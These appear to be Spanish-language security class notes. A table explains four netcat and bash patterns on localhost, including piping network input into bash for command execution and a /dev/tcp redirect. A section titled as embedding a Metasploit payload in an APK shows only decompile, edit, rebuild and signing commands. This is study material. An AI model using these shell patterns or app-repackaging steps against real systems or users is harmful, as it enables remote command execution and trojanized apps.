| Caso | Comandos | Qué hace realmente | ¿Quién ejecuta? |
| ---- | -------- | ------------------ | --------------- |
| 1 | `nc -lk 1234` + `nc 127.0.0.1 1234` | **Chat/TCP crudo**: lo que escribes en un lado se ve en el otro. | Nadie “ejecuta”; solo se transmite texto. |
| 2 | `nc -lk 1234` + `bash -c 'bash > /dev/tcp/127.0.0.1/1234'` | Intento de **volcar salida de Bash a un socket**. Un `bash` sin instrucciones no “produce” salida útil y no hay interactividad (sin TTY/PTY). | No estás ejecutando órdenes remotas; estás intentando enviar I/O. |
| 3 | `nc -lk 1234 \| bash` + `nc 127.0.0.1 1234` | El listener recibe texto y se lo pasa a `bash` para que lo interprete como script: **ejecución en el lado que escucha** de lo que entra por la red. | Ejecuta **el equipo del listener** (donde está pipe bash). |
| 4 | `nc -lk 1234` + `nc 127.0.0.1 1234 \| bash` | El cliente ejecutaría lo que reciba desde la red (si el listener le envía “script”): **ejecución en el lado del cliente** de lo recibido. | Ejecuta **el equipo del cliente** (donde está pipe bash). |

# Embed a Metasploit Payload in an Original .Apk
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019-01-10.md
* https://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-part-2-do-manually-0167124/
```Bash
sudo apt update
sudo apt install -y apktool openjdk-17-jdk

apktool d -f -r app-debug.apk -o original_nres

nano original/res/values/strings.xml

apktool b original_nres -o app-mod-unsigned.apk
keytool -genkeypair -v -keystore lab.keystore -alias labkey -keyalg RSA -keysize 2048 -validity 3650
jarsigner -verbose -keystore lab.keystore app-mod-unsigned.apk labkey
```
